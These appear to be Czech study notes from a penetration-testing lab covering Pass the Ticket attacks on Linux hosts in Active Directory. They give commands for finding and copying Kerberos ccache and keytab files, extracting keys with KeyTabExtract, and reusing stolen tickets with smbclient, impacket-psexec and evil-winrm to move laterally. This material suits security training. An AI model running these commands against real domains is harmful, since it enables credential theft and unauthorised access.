# 🎟️ Pass the Ticket (PtT) Linux

---

# 1. Kerberos na Linuxu

Linux nemá nativně Windows komponentu LSASS. Pro komunikaci s Active Directory používá několik mechanismů:

---

## SSSD (System Security Services Daemon)

Moderní řešení pro připojení Linuxu k AD.

Použití:

- autentizace uživatelů
    
- správa doménových účtů
    
- ukládání Kerberos ticketů
    

Kontrola:

```bash
ps -ef | grep -i sssd
```

---

## Keytab soubory

Keytab je soubor obsahující Kerberos klíče.

Používá se pro:

- služby běžící bez interaktivního přihlášení
    
- automatické autentizace
    
- počítačové účty
    

Typické umístění:

```text
/etc/krb5.keytab
```

Obsahuje například:

```text
LINUX01$@DOMAIN.LOCAL
```

---

## CCACHE soubory

Linux ukládá Kerberos tickety do cache souborů.

Typické umístění:

```text
/tmp/krb5cc_<UID>
```

Příklad:

```text
/tmp/krb5cc_1000
```

Obsahuje:

- TGT
    
- uživatelskou identitu
    
- platnost ticketu
    

---

# 2. Enumerace Kerberos prostředí

---

## Identifikace domény

```bash
realm list
```

Získáš:

- název domény
    
- konfiguraci AD
    
- povolené uživatele
    

---

## Kontrola Kerberos služeb

```bash
ps -ef | grep -i "sssd\|winbind"
```

---

# 3. Hledání ticketů

---

## CCACHE soubory

Vyhledání:

```bash
ls -la /tmp/krb5cc_*
```

---

UID určuje vlastníka:

```text
krb5cc_1000
        |
        ▼
UID 1000
```

---

Pokud najdeš ticket privilegovaného uživatele:

```text
Domain Admin
Administrator
Service Account
```

může být použit pro PtT.

---

# 4. Hledání Keytab souborů

Vyhledání:

```bash
find / -name "*.keytab" 2>/dev/null
```

---

Nejzajímavější:

```text
/etc/krb5.keytab
```

---

Obsah:

```bash
klist -k -t /etc/krb5.keytab
```

---

Zobrazí:

```text
Principal
Timestamp
Encryption Type
```

---

# 5. Útok na Keytab

Keytab umožňuje získat Kerberos identitu bez znalosti hesla.

---

## Kontrola keytabu

```bash
klist -k -t <soubor.keytab>
```

---

Příklad:

```text
carlos@INLANEFREIGHT.HTB
```

---

## Získání TGT ticketu

```bash
kinit <USER>@<DOMAIN> \
-k \
-t <KEYTAB>
```

---

Výsledek:

```text
Kerberos TGT uložený v session
```

---

Kontrola:

```bash
klist
```

---

# 6. Extrakce klíčů z Keytab

Nástroj:

```text
KeyTabExtract
```

---

Použití:

```bash
python3 keytabextract.py <file>.keytab
```

---

Výstup:

- NTLM hash
    
- AES128 key
    
- AES256 key
    

---

AES klíče lze použít pro:

- OverPass the Hash
    
- získání Kerberos ticketů
    

---

# 7. Pass the Ticket přes CCACHE

Klasický Linux PtT útok.

---

## Najití ticketu

```bash
ls /tmp/krb5cc_*
```

---

## Kopie ticketu

```bash
cp /tmp/krb5cc_<UID> /tmp/my_ticket
```

---

## Nastavení ticketu

```bash
export KRB5CCNAME=/tmp/my_ticket
```

---

Kontrola:

```bash
klist
```

---

Výsledek:

```text
Principal:
user@DOMAIN.LOCAL
```

---

# 8. Přístup přes Kerberos ticket

Po nastavení CCACHE není potřeba heslo.

---

## SMB přístup

```bash
smbclient //<TARGET>/C$ \
-k \
-no-pass
```

Parametry:

|Parametr|Význam|
|---|---|
|-k|Použije Kerberos|
|-no-pass|Nepoužívá heslo|

---

# 9. Použití z Kali Linuxu

Scénář:

```text
Linux Target
      |
      ▼
CCACHE Ticket
      |
      ▼
Přenos na Kali
      |
      ▼
KRB5CCNAME
      |
      ▼
Kerberos útok
```

---

## Nastavení ticketu

```bash
export KRB5CCNAME=ticket.ccache
```

---

# Impacket

Kerberos autentizace:

```bash
proxychains impacket-psexec \
DOMAIN.LOCAL/user@dc01.domain.local \
-k \
-no-pass
```

---

# Evil-WinRM

```bash
proxychains evil-winrm \
-i dc01.domain.local \
-r DOMAIN.LOCAL
```

---

# 10. Převod ticketů

Linux:

```text
.ccache
```

Windows:

```text
.kirbi
```

---

Nástroj:

```text
impacket-ticketConverter
```

Použití:

```bash
ticketConverter ticket.ccache ticket.kirbi
```

---

# 11. Troubleshooting

---

## 1. Clock Skew

Kerberos vyžaduje správný čas.

Kontrola:

```bash
date
```

Synchronizace:

```bash
ntpdate <IP_DC>
```

---

## 2. IP vs hostname

Špatně:

```bash
psexec 10.129.x.x
```

Správně:

```bash
psexec dc01.domain.local
```

Kerberos potřebuje DNS jméno.

---

## 3. KRB5CCNAME formát

Vyzkoušet:

```bash
export KRB5CCNAME=/path/ticket.ccache
```

nebo:

```bash
export KRB5CCNAME=FILE:/path/ticket.ccache
```

---

## 4. Expirace ticketu

Kontrola:

```bash
klist
```

Pokud:

```text
Expired
```

ticket už nelze použít.

---

# 12. Nástroje

|Nástroj|Účel|
|---|---|
|klist|Správa ticketů|
|kinit|Získání TGT|
|SSSD|AD integrace|
|KeyTabExtract|Extrakce klíčů|
|Linikatz.sh|Automatický dumping|
|Impacket-ticketConverter|Převod CCACHE/KIRBI|
|Impacket|Kerberos útoky|

---

# Workflow

```text
Enumerace Linux AD
        |
        ▼
Najdi CCACHE / Keytab
        |
        ▼
Získej Kerberos ticket
        |
        ▼
Nastav KRB5CCNAME
        |
        ▼
Pass the Ticket
        |
        ▼
Lateral Movement
```
